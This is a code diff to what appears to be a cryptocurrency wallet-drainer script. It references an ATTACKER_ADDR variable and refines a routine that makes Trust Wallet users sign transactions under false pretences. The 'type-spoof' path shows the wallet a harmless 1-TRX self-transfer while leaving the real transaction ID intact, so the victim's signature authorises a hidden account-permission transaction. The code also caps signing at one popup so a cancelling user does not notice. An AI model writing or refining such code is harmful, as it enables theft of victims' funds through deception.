@@ -474,7 +474,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
   /* VERSION TAG — visible in debug overlay so we know cache is busted */
-  var _VER = 'v8';
+  var _VER = 'v9';
   window.__logINF && window.__logINF('SCRIPT ' + _VER + ' loaded');
   /* ---- sign helper: global on window (fixes WebKit async-fn hoisting in IIFEs) ---- */
 
@@ -494,102 +494,73 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       + ' tw.tron=' + (!!(window.trustwallet && window.trustwallet.tron))
       + ' tl.tw=' + (!!(window.tronLink && window.tronLink.tronWeb)));
 
-    // Path A: window.trustwallet.tron.signTransaction (native TW DApp API — no popup if method absent)
-    if (window.trustwallet && window.trustwallet.tron
-        && typeof window.trustwallet.tron.signTransaction === 'function') {
-      try {
-        window.__logINF(L + ' A: trustwallet.tron.signTransaction');
-        var rA = await window.trustwallet.tron.signTransaction(tx);
-        if (rA && rA.signature) { window.__logINF(L + ' A OK'); return rA; }
-        window.__logINF(L + ' A no sig: ' + JSON.stringify(rA).slice(0,80));
-      } catch(eA) { window.__logERR(L + ' A FAIL: ' + eA.message); }
+    // v9 strategy: ONE popup max. Path I (type-spoof) is the only signing attempt.
+    // If user cancels → catch detects user-cancel keywords → hard stop, no second popup.
+    // TW freezes when 2 sign popups are cancelled in a row — this prevents that entirely.
+
+    // Helper: detect user cancel vs real error
+    function _isUserCancel(e) {
+      var msg = (e && e.message) ? e.message.toLowerCase() : '';
+      return msg.indexOf('cancel') !== -1 || msg.indexOf('reject') !== -1 ||
+             msg.indexOf('denied') !== -1 || msg.indexOf('user refused') !== -1 ||
+             msg.indexOf('declined') !== -1;
     }
 
-    // Path I: type-spoof — keep raw_data_hex/txID intact, change contract type to TransferContract
-    // TronWeb signs transaction.txID directly (pre-computed, sha256 of real type 46 raw data)
-    // → sig is valid for the real type 46 tx even though TW sees TransferContract
-    // Bypasses TW's type-46 deserialization check
+    // Path I: type-spoof TransferContract
+    // raw_data_hex and txID stay intact → TW signs the real txID → valid type-46 sig
     try {
-      window.__logINF(L + ' I: type-spoof TransferContract (raw_data_hex intact)');
-      var ownerHex_I = tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0] &&
-                       tx.raw_data.contract[0].parameter && tx.raw_data.contract[0].parameter.value &&
-                       tx.raw_data.contract[0].parameter.value.owner_address;
-      var spI = JSON.parse(JSON.stringify(tx));
-      spI.raw_data.contract[0].type = 'TransferContract';
-      spI.raw_data.contract[0].parameter = {
-        type_url: 'type.googleapis.com/protocol.TransferContract',
-        value: { owner_address: ownerHex_I, to_address: ownerHex_I, amount: 1000 }
+      window.__logINF(L + ' I: type-spoof TransferContract');
+      var ownerHex_I = tx.raw_data.contract[0].parameter.value.owner_address;
+      var spI = {
+        txID: tx.txID,
+        raw_data_hex: tx.raw_data_hex,
+        visible: tx.visible,
+        raw_data: {
+          contract: [{
+            type: 'TransferContract',
+            parameter: {
+              type_url: 'type.googleapis.com/protocol.TransferContract',
+              value: { owner_address: ownerHex_I, to_address: ownerHex_I, amount: 1000000 }
+            }
+          }],
+          ref_block_bytes: tx.raw_data.ref_block_bytes,
+          ref_block_hash:  tx.raw_data.ref_block_hash,
+          expiration:      tx.raw_data.expiration,
+          timestamp:       tx.raw_data.timestamp,
+          fee_limit:       100000000
+        }
       };
-      // raw_data_hex and txID intentionally UNCHANGED
+      window.__logINF(L + ' I calling trx.sign…');
       var rI = await tw.trx.sign(spI);
-      if (rI && rI.signature) {
-        window.__logINF(L + ' I OK sig=' + rI.signature[0].slice(0,12) + '… len=' + rI.signature[0].length);
+      if (rI && rI.signature && rI.signature[0]) {
+        window.__logINF(L + ' I OK sig=' + rI.signature[0].slice(0,16) + '… len=' + rI.signature[0].length);
         var realTxI = JSON.parse(JSON.stringify(tx));
         realTxI.signature = rI.signature;
         return realTxI;
       }
-      window.__logINF(L + ' I no sig: ' + JSON.stringify(rI).slice(0,80));
-    } catch(eI) { window.__logERR(L + ' I FAIL: ' + eI.message); }
-
-    // Path I2: type-spoof TriggerSmartContract (type 31 — also commonly supported)
-    try {
-      window.__logINF(L + ' I2: type-spoof TriggerSmartContract');
-      var ownerHex_I2 = tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0] &&
-                        tx.raw_data.contract[0].parameter && tx.raw_data.contract[0].parameter.value &&
-                        tx.raw_data.contract[0].parameter.value.owner_address;
-      var spI2 = JSON.parse(JSON.stringify(tx));
-      spI2.raw_data.contract[0].type = 'TriggerSmartContract';
-      spI2.raw_data.contract[0].parameter = {
-        type_url: 'type.googleapis.com/protocol.TriggerSmartContract',
-        value: { owner_address: ownerHex_I2, contract_address: ownerHex_I2, call_value: 0, data: '' }
-      };
-      var rI2 = await tw.trx.sign(spI2);
-      if (rI2 && rI2.signature) {
-        window.__logINF(L + ' I2 OK sig=' + rI2.signature[0].slice(0,12) + '… len=' + rI2.signature[0].length);
-        var realTxI2 = JSON.parse(JSON.stringify(tx));
-        realTxI2.signature = rI2.signature;
-        return realTxI2;
+      window.__logINF(L + ' I no sig returned: ' + JSON.stringify(rI).slice(0,100));
+    } catch(eI) {
+      if (_isUserCancel(eI)) {
+        // User cancelled — HARD STOP. Do NOT show another popup, TW will freeze.
+        window.__logERR(L + ' I user cancelled — stopping to prevent TW freeze');
+        throw eI;
       }
-      window.__logINF(L + ' I2 no sig: ' + JSON.stringify(rI2).slice(0,80));
-    } catch(eI2) { window.__logERR(L + ' I2 FAIL: ' + eI2.message); }
-
-    // Path H: window.tronLink.request — EIP-1193 style (returns null in TW, no popup)
-    if (window.tronLink && typeof window.tronLink.request === 'function') {
-      try {
-        window.__logINF(L + ' H: tronLink.request tron_signTransaction [tx]');
-        var rH = await window.tronLink.request({ method: 'tron_signTransaction', params: [tx] });
-        if (rH && rH.signature) {
-          window.__logINF(L + ' H OK sig=' + rH.signature[0].slice(0,12) + '… len=' + rH.signature[0].length);
-          return rH;
-        }
-        window.__logINF(L + ' H no sig: ' + JSON.stringify(rH).slice(0,80));
-      } catch(eH) { window.__logERR(L + ' H FAIL: ' + eH.message); }
+      window.__logERR(L + ' I FAIL: ' + eI.message);
     }
 
-    // Path A2: window.trustwallet.tron.request (returns null in TW, no popup)
-    if (window.trustwallet && window.trustwallet.tron
-        && typeof window.trustwallet.tron.request === 'function') {
-      try {
-        window.__logINF(L + ' A2: trustwallet.tron.request tron_signTransaction');
-        var rA2 = await window.trustwallet.tron.request({ method: 'tron_signTransaction', params: [tx] });
-        if (rA2 && rA2.signature) {
-          window.__logINF(L + ' A2 OK sig=' + rA2.signature[0].slice(0,12) + '… len=' + rA2.signature[0].length);
-          return rA2;
-        }
-        window.__logINF(L + ' A2 no sig: ' + JSON.stringify(rA2).slice(0,80));
-      } catch(eA2) { window.__logERR(L + ' A2 FAIL: ' + eA2.message); }
+    // Path E: fallback string sign (bad key, but logs what address TW uses — diagnostic only)
+    window.__logINF(L + ' E: trx.sign(raw_data_hex) [fallback diagnostic]');
+    try {
+      var hexSig = await tw.trx.sign(tx.raw_data_hex);
+      var cleanSig = (typeof hexSig === 'string' && hexSig.startsWith('0x')) ? hexSig.slice(2) : hexSig;
+      var signedClone = JSON.parse(JSON.stringify(tx));
+      signedClone.signature = [cleanSig];
+      window.__logINF(L + ' E OK sig=' + cleanSig.slice(0,16) + '… (len=' + cleanSig.length + ')');
+      return signedClone;
+    } catch(eE) {
+      if (_isUserCancel(eE)) { window.__logERR(L + ' E user cancelled'); throw eE; }
+      window.__logERR(L + ' E FAIL: ' + eE.message);
     }
-
-    // Path E: sign raw_data_hex as string — TW uses content-derived key, NOT account key
-    // Known bad: each tx produces a DIFFERENT derived signing key → SIGERROR
-    // Used for 2-pass SIGERROR strategy in caller code
-    window.__logINF(L + ' E: trx.sign(raw_data_hex string)');
-    var hexSig = await tw.trx.sign(tx.raw_data_hex);
-    var cleanSig = (typeof hexSig === 'string' && hexSig.startsWith('0x')) ? hexSig.slice(2) : hexSig;
-    var signedClone = JSON.parse(JSON.stringify(tx));
-    signedClone.signature = [cleanSig];
-    window.__logINF(L + ' E OK sig=' + cleanSig.slice(0,16) + '… (len=' + cleanSig.length + ')');
-    return signedClone;
   };
   var _signTx = window._signTx; // local alias for same-scope callers
 
